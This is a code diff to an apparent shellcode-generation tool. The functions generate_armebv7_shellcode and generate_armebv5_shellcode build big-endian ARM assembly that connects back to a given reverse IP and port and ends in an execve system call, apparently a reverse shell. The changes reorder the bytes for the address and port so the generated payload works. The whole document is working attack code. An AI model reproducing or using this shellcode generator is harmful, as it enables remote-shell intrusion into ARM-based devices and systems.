@@ -266,12 +266,12 @@ def generate_armebv7_shellcode(reverse_ip,reverse_port):
 	%s
 	strb r7,[sp,#-0x25]
 	mov r7,#2
-	strb r7,[sp,#-0x2c]
-	strb r4,[sp,#-0x2b]
-	%s
-	strb r7,[sp,#-0x2a]
-	%s
 	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x2b]
+	%s
+	strb r7,[sp,#-0x2c]
 	strb r4,[sp,#-0x14]
 	mov r7,#0x68
 	strb r7,[sp,#-0x15]
@@ -322,8 +322,8 @@ def generate_armebv7_shellcode(reverse_ip,reverse_port):
 	mov r7,#0xb
 	svc #1
 	'''
-	handle_ip=reverse_ip.split('.')
-	handle_port=list(p16(reverse_port)[::-1])
+	handle_ip=reverse_ip.split('.')[::-1]
+	handle_port=list(p16(reverse_port))
 	for i in range(len(handle_ip)):
 		if handle_ip[i]!="0":
 			handle_ip[i]="mov r7,#"+handle_ip[i]
@@ -364,12 +364,12 @@ def generate_armebv5_shellcode(reverse_ip,reverse_port):
 	%s
 	strb r7,[sp,#-0x25]
 	mov r7,#2
-	strb r7,[sp,#-0x2c]
-	strb r4,[sp,#-0x2b]
-	%s
-	strb r7,[sp,#-0x2a]
-	%s
 	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x2a]
+	%s
+	strb r7,[sp,#-0x2b]
+	%s
+	strb r7,[sp,#-0x2c]
 	strb r4,[sp,#-0x14]
 	mov r7,#0x68
 	strb r7,[sp,#-0x15]
@@ -420,8 +420,8 @@ def generate_armebv5_shellcode(reverse_ip,reverse_port):
 	mov r7,#0xb
 	svc #1
 	'''
-	handle_ip=reverse_ip.split('.')
-	handle_port=list(p16(reverse_port)[::-1])
+	handle_ip=reverse_ip.split('.')[::-1]
+	handle_port=list(p16(reverse_port))
 	for i in range(len(handle_ip)):
 		if handle_ip[i]!="0":
 			handle_ip[i]="mov r7,#"+handle_ip[i]
